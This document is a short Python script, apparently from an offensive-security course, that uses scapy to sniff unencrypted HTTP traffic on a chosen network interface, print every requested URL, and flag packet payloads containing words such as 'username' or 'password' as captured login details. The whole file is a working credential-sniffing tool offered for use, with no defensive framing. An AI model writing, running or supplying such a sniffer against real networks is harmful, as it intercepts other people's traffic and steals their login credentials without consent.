#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", help="Enter an interface to capture it's packets")
options = parser.parse_args()

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet, filter="port 80")
def get_url(packet):
    #returns URL by appending host and path. Ex: google.com + /search?q=...
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load_lower = load.lower()
        keywords = ['login', 'user', 'username', 'pass', 'password']
        for keyword in keywords:
            if re.search(keyword, load, re.IGNORECASE):
                return load
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]HTTPRequest >>> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+]Possible username and password " + login_info + "\n\n")

sniff(options.interface)